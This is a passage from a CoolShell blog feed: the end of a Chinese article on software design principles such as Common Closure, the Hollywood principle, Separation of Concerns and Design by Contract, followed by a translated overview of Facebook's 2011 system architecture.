<span class="ez-toc-section" id="Common_Closure_Principle%EF%BC%88CCP%EF%BC%89-_%E5%85%B1%E5%90%8C%E5%B0%81%E9%97%AD%E5%8E%9F%E5%88%99"></span>Common Closure Principle（CCP）– 共同封闭原则<span class="ez-toc-section-end"></span>
</h4>
<p>一个包中所有的类应该对同一种类型的变化关闭。一个变化影响一个包，便影响了包中所有的类。一个更简短的说法是：一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。CCP原则就是把因为某个同样的原因而需要修改的所有类组合进一个包里。如果2个类从物理上或者从概念上联系得非常紧密，它们通常一起发生改变，那么它们应该属于同一个包。</p>
<p>CCP延伸了开闭原则（OCP）的“关闭”概念，当因为某个原因需要修改时，把需要修改的范围限制在一个最小范围内的包里。</p>
<p><strong>参考</strong>：<a href="http://c2.com/cgi/wiki?CommonClosurePrinciple">http://c2.com/cgi/wiki?CommonClosurePrinciple</a></p>
<h4>
<span class="ez-toc-section" id="Common_Reuse_Principle_CRP_-_%E5%85%B1%E5%90%8C%E9%87%8D%E7%94%A8%E5%8E%9F%E5%88%99"></span>Common Reuse Principle (CRP) – 共同重用原则<span class="ez-toc-section-end"></span>
</h4>
<p>包的所有类被一起重用。如果你重用了其中的一个类，就重用全部。换个说法是，没有被一起重用的类不应该被组合在一起。CRP原则帮助我们决定哪些类应该被放到同一个包里。依赖一个包就是依赖这个包所包含的一切。当一个包发生了改变，并发布新的版本，使用这个包的所有用户都必须在新的包环境下验证他们的工作，即使被他们使用的部分没有发生任何改变。因为如果包中包含有未被使用的类，即使用户不关心该类是否改变，但用户还是不得不升级该包并对原来的功能加以重新测试。</p>
<p>CCP则让系统的维护者受益。CCP让包尽可能大（CCP原则加入功能相关的类），CRP则让包尽可能小（CRP原则剔除不使用的类）。它们的出发点不一样，但不相互冲突。</p>
<p><strong>参考</strong>：<a href="http://c2.com/cgi/wiki?CommonReusePrinciple">http://c2.com/cgi/wiki?CommonReusePrinciple</a></p>
<h4>
<span class="ez-toc-section" id="Hollywood_Principle_-_%E5%A5%BD%E8%8E%B1%E5%9D%9E%E5%8E%9F%E5%88%99"></span>Hollywood Principle – 好莱坞原则<span class="ez-toc-section-end"></span>
</h4>
<p>好莱坞原则就是一句话——“don’t call us, we’ll call you.”。意思是，好莱坞的经纪人们不希望你去联系他们，而是他们会在需要的时候来联系你。也就是说，所有的组件都是被动的，所有的组件初始化和调用都由容器负责。组件处在一个容器当中，由容器负责管理。</p>
<p>简单的来讲，就是由容器控制程序之间的关系，而非传统实现中，由程序代码直接操控。这也就是所谓“控制反转”的概念所在：</p>
<ol>
<li>不创建对象，而是描述创建对象的方式。</li>
<li>在代码中，对象与服务没有直接联系，而是容器负责将这些联系在一起。</li>
</ol>
<p>控制权由应用代码中转到了外部容器，控制权的转移，是所谓反转。</p>
<p>好莱坞原则就是IoC（Inversion of Control）或DI（Dependency Injection ）的基础原则。这个原则很像依赖倒置原则，依赖接口，而不是实例，但是这个原则要解决的是怎么把这个实例传入调用类中？你可能把其声明成成员，你可以通过构造函数，你可以通过函数参数。但是 IoC可以让你通过配置文件，一个由Service Container 读取的配置文件来产生实际配置的类。但是程序也有可能变得不易读了，程序的性能也有可能还会下降。</p>
<p><strong>参考</strong>：</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Hollywood_Principle">http://en.wikipedia.org/wiki/Hollywood_Principle</a></li>
<li><a href="https://en.wikipedia.org/wiki/Inversion_of_Control">http://en.wikipedia.org/wiki/Inversion_of_Control</a></li>
</ul>
<h4>
<span class="ez-toc-section" id="High_Cohesion_LowLoose_coupling_-_%E9%AB%98%E5%86%85%E8%81%9A%EF%BC%8C_%E4%BD%8E%E8%80%A6%E5%90%88"></span>High Cohesion &amp; Low/Loose coupling &amp; – 高内聚， 低耦合<span class="ez-toc-section-end"></span>
</h4>
<p>这个原则是UNIX操作系统设计的经典原则，把模块间的耦合降到最低，而努力让一个模块做到精益求精。</p>
<ul>
<li>内聚：一个模块内各个元素彼此结合的紧密程度</li>
<li>耦合：一个软件结构内不同模块之间互连程度的度量</li>
</ul>
<p>内聚意味着重用和独立，耦合意味着多米诺效应牵一发动全身。</p>
<p><strong>参考</strong>：</p>
<ul>
<li><a title="http://en.wikipedia.org/wiki/Coupling_(computer_science)" rel="nofollow" href="https://en.wikipedia.org/wiki/Coupling_%28computer_science%29">http://en.wikipedia.org/wiki/Coupling_(computer_science)</a></li>
<li><a title="http://en.wikipedia.org/wiki/Cohesion_(computer_science)" rel="nofollow" href="https://en.wikipedia.org/wiki/Cohesion_%28computer_science%29">http://en.wikipedia.org/wiki/Cohesion_(computer_science)</a></li>
</ul>
<h4>
<span class="ez-toc-section" id="Convention_over_Configuration%EF%BC%88CoC%EF%BC%89-_%E6%83%AF%E4%BE%8B%E4%BC%98%E4%BA%8E%E9%85%8D%E7%BD%AE%E5%8E%9F%E5%88%99"></span>Convention over Configuration（CoC）– 惯例优于配置原则<span class="ez-toc-section-end"></span>
</h4>
<p>简单点说，就是将一些公认的配置方式和信息作为内部缺省的规则来使用。例如，Hibernate的映射文件，如果约定字段名和类属性一致的话，基本上就可以不要这个配置文件了。你的应用只需要指定不convention的信息即可，从而减少了大量convention而又不得不花时间和精力啰里啰嗦的东东。配置文件很多时候相当的影响开发效率。</p>
<p>Rails 中很少有配置文件（但不是没有，数据库连接就是一个配置文件），Rails 的fans号称期开发效率是 java 开发的 10 倍，估计就是这个原因。Maven也使用了CoC原则，当你执行mvn -compile命令的时候，不需要指源文件放在什么地方，而编译以后的class文件放置在什么地方也没有指定，这就是CoC原则。</p>
<p><strong>参考</strong>：<a title="http://en.wikipedia.org/wiki/Convention_over_Configuration" rel="nofollow" href="https://en.wikipedia.org/wiki/Convention_over_Configuration">http://en.wikipedia.org/wiki/Convention_over_Configuration</a></p>
<h4>
<span class="ez-toc-section" id="Separation_of_Concerns_SoC_-_%E5%85%B3%E6%B3%A8%E7%82%B9%E5%88%86%E7%A6%BB"></span>Separation of Concerns (SoC) – 关注点分离<span class="ez-toc-section-end"></span>
</h4>
<p>SoC 是计算机科学中最重要的努力目标之一。这个原则，就是在软件开发中，通过各种手段，将问题的各个关注点分开。如果一个问题能分解为独立且较小的问题，就是相对较易解决的。问题太过于复杂，要解决问题需要关注的点太多，而程序员的能力是有限的，不能同时关注于问题的各个方面。正如程序员的记忆力相对于计算机知识来说那么有限一样，程序员解决问题的能力相对于要解决的问题的复杂性也是一样的非常有限。在我们分析问题的时候，如果我们把所有的东西混在一起讨论，那么就只会有一个结果——乱。</p>
<p>我记得在上一家公司有一个项目，讨论就讨论了1年多，项目本来不复杂，但是没有使用SoC，全部的东西混为一谈，再加上一堆程序员注入了各种不同的观点和想法，整个项目一下子就失控了。最后，本来一个1年的项目做了3年。</p>
<p>实现关注点分离的方法主要有两种，一种是标准化，另一种是抽象与包装。标准化就是制定一套标准，让使用者都遵守它，将人们的行为统一起来，这样使用标准的人就不用担心别人会有很多种不同的实现，使自己的程序不能和别人的配合。Java EE就是一个标准的大集合。每个开发者只需要关注于标准本身和他所在做的事情就行了。就像是开发镙丝钉的人只专注于开发镙丝钉就行了，而不用关注镙帽是怎么生产的，反正镙帽和镙丝钉按标来就一定能合得上。不断地把程序的某些部分抽像差包装起来，也是实现关注点分离的好方法。一旦一个函数被抽像出来并实现了，那么使用函数的人就不用关心这个函数是如何实现的，同样的，一旦一个类被抽像并实现了，类的使用者也不用再关注于这个类的内部是如何实现的。诸如组件，分层，面向服务，等等这些概念都是在不同的层次上做抽像和包装，以使得使用者不用关心它的内部实现细节。</p>
<p>说白了还是“高内聚，低耦合”。</p>
<p><strong>参考</strong>：<a href="http://sulong.me/archives/99">http://sulong.me/archives/99</a></p>
<h4>
<span class="ez-toc-section" id="Design_by_Contract_DbC_-_%E5%A5%91%E7%BA%A6%E5%BC%8F%E8%AE%BE%E8%AE%A1"></span>Design by Contract (DbC) – 契约式设计<span class="ez-toc-section-end"></span>
</h4>
<p>DbC的核心思想是对软件系统中的元素之间相互合作以及“责任”与“义务”的比喻。这种比喻从商业活动中“客户”与“供应商”达成“契约”而得来。例如：</p>
<ul>
<li>供应商必须提供某种产品（责任），并且他有权期望客户已经付款（权利）。</li>
<li>客户必须付款（责任），并且有权得到产品（权利）。</li>
<li>契约双方必须履行那些对所有契约都有效的责任，如法律和规定等。</li>
</ul>
<p>同样的，如果在程序设计中一个模块提供了某种功能，那么它要：</p>
<ul>
<li>期望所有调用它的客户模块都保证一定的进入条件：这就是模块的先验条件（客户的义务和供应商的权利，这样它就不用去处理不满足先验条件的情况）。</li>
<li>保证退出时给出特定的属性：这就是模块的后验条件——（供应商的义务，显然也是客户的权利）。</li>
<li>在进入时假定，并在退出时保持一些特定的属性：不变式。</li>
</ul>
<p>契约就是这些权利和义务的正式形式。我们可以用“三个问题”来总结DbC，并且作为设计者要经常问：</p>
<ul>
<li>它期望的是什么？</li>
<li>它要保证的是什么？</li>
<li>它要保持的是什么？</li>
</ul>
<p>根据Bertrand Meyer氏提出的DBC概念的描述，对于类的一个方法，都有一个前提条件以及一个后续条件，前提条件说明方法接受什么样的参数数据等，只有前提条件得到满足时，这个方法才能被调用；同时后续条件用来说明这个方法完成时的状态，如果一个方法的执行会导致这个方法的后续条件不成立，那么这个方法也不应该正常返回。</p>
<p>现在把前提条件以及后续条件应用到继承子类中，子类方法应该满足：</p>
<ol>
<li>前提条件不强于基类．</li>
<li>后续条件不弱于基类．</li>
</ol>
<p>换句话说，通过基类的接口调用一个对象时，用户只知道基类前提条件以及后续条件。因此继承类不得要求用户提供比基类方法要求的更强的前提条件，亦即，继承类方法必须接受任何基类方法能接受的任何条件（参数）。同样，继承类必须顺从基类的所有后续条件，亦即，继承类方法的行为和输出不得违反由基类建立起来的任何约束，不能让用户对继承类方法的输出感到困惑。</p>
<p>这样，我们就有了基于契约的LSP，基于契约的LSP是LSP的一种强化。</p>
<p><strong>参考</strong>：<a href="https://en.wikipedia.org/wiki/Design_by_contract">http://en.wikipedia.org/wiki/Design_by_contract</a></p>
<h4>
<span class="ez-toc-section" id="Acyclic_Dependencies_Principle_ADP_-_%E6%97%A0%E7%8E%AF%E4%BE%9D%E8%B5%96%E5%8E%9F%E5%88%99"></span>Acyclic Dependencies Principle (ADP) – 无环依赖原则<span class="ez-toc-section-end"></span>
</h4>
<p>包之间的依赖结构必须是一个直接的无环图形，也就是说，在依赖结构中不允许出现环（循环依赖）。如果包的依赖形成了环状结构，怎么样打破这种循环依赖呢？有2种方法可以打破这种循环依赖关系：第一种方法是创建新的包，如果A、B、C形成环路依赖，那么把这些共同类抽出来放在一个新的包D里。这样就把C依赖A变成了C依赖D以及A依赖D，从而打破了循环依赖关系。第二种方法是使用DIP（依赖倒置原则）和ISP（接口分隔原则）设计原则。</p>
<p>无环依赖原则（ADP）为我们解决包之间的关系耦合问题。在设计模块时，不能有循环依赖。</p>
<p><strong>参考</strong>：<a href="http://c2.com/cgi/wiki?AcyclicDependenciesPrinciple">http://c2.com/cgi/wiki?AcyclicDependenciesPrinciple</a></p>
<h4>
<span class="ez-toc-section" id="coolshell"></span>————————————————————————————<span class="ez-toc-section-end"></span>
</h4>
<p>上面这些原则可能有些学院派，也可能太为理论，我在这里说的也比较模糊和简单，这里只是给大家一个概貌，如果想要了解更多的东西，大家可以多google一下。</p>
<p>不过这些原则看上去都不难，但是要用好却并不那么容易。要能把这些原则用得好用得精，而不教条，我的经验如下：（我以为这是一个理论到应用的过程）</p>
<ol>
<li>你可以先粗浅或是表面地知道这些原则。</li>
<li>但不要急着马上就使用。</li>
<li>在工作学习中观察和总结别人或自己的设计。</li>
<li>再回过头来了回顾一下这些原则，相信你会有一些自己的心得。</li>
<li>有适度地去实践一下。</li>
<li>Goto第 3步。</li>
</ol>
<p>我相信可能还会有其实一些原则，欢迎大家提供。</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/8961.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8961.html" class="wp_rp_title">从面向对象的设计模式看软件设计</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9949.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_title">IoC/DIP其实是一种管理思想</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8745.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8745.html" class="wp_rp_title">如此理解面向对象编程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/7236.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7236.html" class="wp_rp_title">用Unix的设计思想来应对多变的需求</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5444.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5444.html" class="wp_rp_title">千万不要把 bool 设计成函数参数</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4535" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="a081a159f8">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>30</strong> 人打了分，平均分： <strong>4.60</strong> )<br><span class="post-ratings-text" id="ratings_4535_text"></span><meta itemprop="name" content="一些软件设计的原则">
<meta itemprop="headline" content="一些软件设计的原则">
<meta itemprop="description" content="以前本站向大家介绍过一些软件开发的原则，比如优质代码的十诫和Unix传奇(下篇)中所以说的UNIX的设计原则。相信大家从中能够从中学了解到一些设计原理方面的知识，正如我在《再谈“我是怎么招聘程序”》中所说的，一个好的程序员通常由其操作技能、知识水平，经验层力和能力四个方面组成。在这里想和大家说说设计中的一些原则，我认为这些东西属于长期经验总结出来的知识。这些原则，每一个程序员都应该了解。但是请不要...">
<meta itemprop="datePublished" content="2011-04-25T08:24:18+08:00">
<meta itemprop="dateModified" content="2011-04-25T14:12:51+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4535.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4535.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.6">
<meta itemprop="ratingCount" content="30">
</div>
</div>
<div id="post-ratings-4535-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-25T08:24:18+08:00</pubDate>
<guid>https://coolshell.cn/articles/4535.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Facebook 的系统架构 ]]></title>
<link>https://coolshell.cn/articles/4549.html</link>
<content><![CDATA[ 
<p><strong>来源</strong>：<a title="What is Facebook's Architecture?" href="https://www.quora.com/What-is-Facebooks-architecture" target="_blank">http://www.quora.com/What-is-Facebooks-architecture</a> （由<a href="https://www.quora.com/Micha%C3%ABl-Figui%C3%A8re">Micha?l Figuière</a>回答）</p>
<p>根据我现有的阅读和谈话，我所理解的今天Facebook的架构如下：</p>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>Web 前端是由 PHP 写的。Facebook 的 <a href="http://developers.facebook.com/blog/post/358" target="_blank">HipHop </a>[1] 会把PHP转成 C++ 并用 g++编译，这样就可以为模板和Web逻贺业务层提供高的性能。</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>业务逻辑以Service的形式存在，其使用<a href="https://thrift.apache.org/" target="_blank">Thrift </a>[2]。这些Service根据需求的不同由PHP，C++或Java实现（也可以用到了其它的一些语言……）</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>用Java写的Services没有用到任何一个企业级的应用服务器，但用到了Facebook自己的定制的应用服务器。看上去好像是重新发明轮子，但是这些Services只被暴露给Thrift使用（绝大所数是这样），Tomcat太重量级了，即使是Jetty也可能太过了点，其附加值对Facebook所需要的没有意义。</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>持久化由MySQL, <a href="https://memcached.org/" target="_blank">Memcached </a>[3], Facebook 的 <a href="https://cassandra.apache.org/" target="_blank">Cassandra </a>[4], Hadoop 的 <a href="https://hbase.apache.org/" target="_blank">HBase </a>[5] 完成。Memcached 使用了MySQL的内存Cache。Facebook 工程师承认他们的Cassandra 使用正在减少，因为他们更喜欢HBase，因为它的更简单的一致性模型，以到其MapReduce能力。</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>离线处理使用Hadoop 和 Hive。</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>日志，点击，feeds数据使用<a href="https://github.com/facebook/scribe" target="_blank">Scribe </a>[6]，把其聚合并存在 HDFS，其使用<a href="https://hadoopblog.blogspot.com/2009/06/hdfs-scribe-integration.html" target="_blank">Scribe-HDFS </a>[7]，因而允许使用MapReduce进行扩展分析。</li>
</ul>
<p><span id="more-4549"></span></p>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>
<a href="https://www.facebook.com/notes/facebook-engineering/bigpipe-pipelining-web-pages-for-high-performance/389414033919" target="_blank">BigPipe </a>[8] 是他们的定制技术，用来加速页面显示。</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>
<a href="https://www.varnish-cache.org/" target="_blank">Varnish Cache</a> [9]用作HTTP代理。他们用这个的原因是<a href="https://www.varnish-software.com/customers/facebook" target="_blank">高速和有效率</a>。 [10].</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>用来搞定用户<a href="https://www.facebook.com/note.php?note_id=76191543919" target="_blank">上传的十亿张照片的存储</a>，其由Haystack处理，Facebook自己开发了一个Ad-Hoc存储方案，其主要做了一些低层优化和“仅追加”写技术 [11].</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>Facebook Messages 使用了自己的架构，其明显地构建在了一个动态集群的基础架构上。业务逻辑和持久化被封装在一个所谓的’Cell’。每个‘Cell’都处理一部分用户，新的‘Cell’可以因为访问热度被添加[12]。 持久化归档使用HBase [13]。</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>Facebook Messages 的搜索引擎由存储在HBase中的一个倒置索引的构建。 [14]</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>Facebook 搜索引擎实现细节据我所知目前是未知状态。</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>Typeahead 搜索使用了一个定制的存储和检索逻辑。 [15]</li>
</ul>
<ul style="margin: 5px 0px 0px 1.6em; padding: 0px; list-style-type: disc;">
<li>Chat 基于一个Epoll 服务器，这个服务器由Erlang 开发，由Thrift存取 [16]</li>
</ul>
<p>关于那些供给给上述组件的资源，下面是一些信息和数量，但是有一些是未知的：</p>
<ul>
<li>Facebook估计有超过60,000 台服务器[16]。他们最新的数据中心在俄勒冈州的Prineville，其基于完全自定设计的硬件[17] 那是最近才公开的 <a href="http://opencompute.org" target="_blank">Open Compute 项目</a>[18]。</li>
</ul>
<ul>
<li>300 TB 的数据存在 Memcached 中处理 [19]</li>
</ul>
<ul>
<li>他们的Hadoop 和 Hive 集群由3000 服务器组成，每台服务器有8个核，32GB的内存，12TB的硬盘，全部有2万4千个CPU的核，96TB内存和36PB的硬盘。 [20]</li>
</ul>
<ul>
<li>每天有1000亿的点击量，500亿张照片， 3 万亿个对象被 Cache，每天130TB的日志（<a href="https://www.facebook.com/note.php?note_id=409881258919" target="_blank">2010年7月的数据</a>） [21]</li>
</ul>
<p><strong>参考引用</strong></p>
<p>[1] <em style="margin: 0px; padding: 0px;">HipHop for PHP</em>: <a href="https://developers.facebook.com/blog/post/358">http://developers.facebook.com/blog/post/358</a><br style="margin: 0px; padding: 0px;">[2] <em style="margin: 0px; padding: 0px;">Thrift</em>: <a href="https://thrift.apache.org/">http://thrift.apache.org/</a><br style="margin: 0px; padding: 0px;">[3] <em style="margin: 0px; padding: 0px;">Memcached</em>: <a href="https://memcached.org/">http://memcached.org/</a><br style="margin: 0px; padding: 0px;">[4] <em style="margin: 0px; padding: 0px;">Cassandra</em>: <a href="https://cassandra.apache.org/">http://cassandra.apache.org/</a><br style="margin: 0px; padding: 0px;">[5] <em style="margin: 0px; padding: 0px;">HBase</em>: <a href="https://hbase.apache.org/">http://hbase.apache.org/</a><br style="margin: 0px; padding: 0px;">[6] <em style="margin: 0px; padding: 0px;">Scribe</em>: <a href="https://github.com/facebook/scribe">https://github.com/facebook/scribe</a><br style="margin: 0px; padding: 0px;">[7] <em style="margin: 0px; padding: 0px;">Scribe-HDFS</em>: <a href="https://hadoopblog.blogspot.com/2009/06/hdfs-scribe-integration.html">http://hadoopblog.blogspot.com/2009/06/hdfs-scribe-integration.html</a><br style="margin: 0px; padding: 0px;">[8] <em style="margin: 0px; padding: 0px;">BigPipe</em>: <a href="https://www.facebook.com/notes/facebook-engineering/bigpipe-pipelining-web-pages-for-high-performance/389414033919">http://www.facebook.com/notes/facebook-engineering/bigpipe-pipelining-web-pages-for-high-performance/389414033919</a><br style="margin: 0px; padding: 0px;">[9] <em style="margin: 0px; padding: 0px;">Varnish Cache</em>: <a href="https://www.varnish-cache.org/">http://www.varnish-cache.org/</a><br style="margin: 0px; padding: 0px;">[10] <em style="margin: 0px; padding: 0px;">Facebook goes for Varnish</em>: <a href="https://www.varnish-software.com/customers/facebook">http://www.varnish-software.com/customers/facebook</a><br style="margin: 0px; padding: 0px;">[11] <em style="margin: 0px; padding: 0px;">Needle in a haystack</em>: efficient storage of billions of photos: <a href="https://www.facebook.com/note.php?note_id=76191543919">http://www.facebook.com/note.php?note_id=76191543919</a><br style="margin: 0px; padding: 0px;">[12] <em style="margin: 0px; padding: 0px;">Scaling the Messages Application Back End</em>: <a href="https://www.facebook.com/note.php?note_id=10150148835363920">http://www.facebook.com/note.php?note_id=10150148835363920</a><br style="margin: 0px; padding: 0px;">[13] <em style="margin: 0px; padding: 0px;">The Underlying Technology of Messages</em>: <a href="https://www.facebook.com/note.php?note_id=454991608919">https://www.facebook.com/note.php?note_id=454991608919</a><br style="margin: 0px; padding: 0px;">[14] <em style="margin: 0px; padding: 0px;">The Underlying Technology of Messages Tech Talk</em>: <a href="https://www.facebook.com/video/video.php?v=690851516105">http://www.facebook.com/video/video.php?v=690851516105</a><br style="margin: 0px; padding: 0px;">[15] <em style="margin: 0px; padding: 0px;">Facebook’s typeahead search architecture</em>: <a href="https://www.facebook.com/video/video.php?v=432864835468">http://www.facebook.com/video/video.php?v=432864835468</a><br style="margin: 0px; padding: 0px;">[16] <em style="margin: 0px; padding: 0px;">Facebook Chat</em>: <a href="https://www.facebook.com/note.php?note_id=14218138919">http://www.facebook.com/note.php?note_id=14218138919</a><br style="margin: 0px; padding: 0px;">[17] <em style="margin: 0px; padding: 0px;">Who has the most Web Servers?</em>: <a href="http://www.datacenterknowledge.com/archives/2009/05/14/whos-got-the-most-web-servers/">http://www.datacenterknowledge.com/archives/2009/05/14/whos-got-the-most-web-servers/</a><br style="margin: 0px; padding: 0px;">[18] B<em style="margin: 0px; padding: 0px;">uilding Efficient Data Centers with the Open Compute Project</em>: <a href="https://www.facebook.com/note.php?note_id=10150144039563920">http://www.facebook.com/note.php?note_id=10150144039563920</a><br style="margin: 0px; padding: 0px;">[19] <em style="margin: 0px; padding: 0px;">Open Compute Project</em>: <a href="http://opencompute.org/">http://opencompute.org/</a><br style="margin: 0px; padding: 0px;">[20] <em style="margin: 0px; padding: 0px;">Facebook’s architecture presentation at Devoxx 2010</em>: <a href="http://www.devoxx.com">http://www.devoxx.com</a><br style="margin: 0px; padding: 0px;">[21] <em style="margin: 0px; padding: 0px;">Scaling Facebook to 500 millions users and beyond</em>: <a href="https://www.facebook.com/note.php?note_id=409881258919">http://www.facebook.com/note.php?note_id=409881258919</a></p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/4939.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4939.html" class="wp_rp_title">Quora使用到的技术</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18140.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18140.html" class="wp_rp_title">关于Facebook 的 React 专利许可证</a>
</li>
<li>
<a href="https://coolshell.cn/articles/7448.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7448.html" class="wp_rp_title">扎克伯格的一封信：关于Facebook IPO</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3721.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3721.html" class="wp_rp_title">Stack Exchange 的架构</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3396.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3396.html" class="wp_rp_title">Facebook全球关系网</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3335.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3335.html" class="wp_rp_title">Groovy是怎么实现createArray的</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4549" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="81186e14a1">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>11</strong> 人打了分，平均分： <strong>4.27</strong> )<br><span class="post-ratings-text" id="ratings_4549_text"></span><meta itemprop="name" content="Facebook 的系统架构">
<meta itemprop="headline" content="Facebook 的系统架构">
<meta itemprop="description" content="来源：http://www.quora.com/What-is-Facebooks-architecture （由Micha?l Figuière回答）

根据我现有的阅读和谈话，我所理解的今天Facebook的架构如下：

	Web 前端是由 PHP 写的。Facebook 的 HipHop [1] 会把PHP转成 C++ 并用 g++编译，这样就可以为模板和Web逻贺业务层提供高的性能...">
<meta itemprop="datePublished" content="2011-04-25T13:39:26+08:00">
<meta itemprop="dateModified" content="2011-04-25T14:12:07+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4549.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4549.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.27">
<meta itemprop="ratingCount" content="11">
</div>
</div>
<div id="post-ratings-4549-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-25T13:39:26+08:00</pubDate>
<guid>https://coolshell.cn/articles/4549.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 对程序员职业的一些建议 ]]></title>
<link>https://coolshell.cn/articles/4561.html</link>
<content><![CDATA[ 
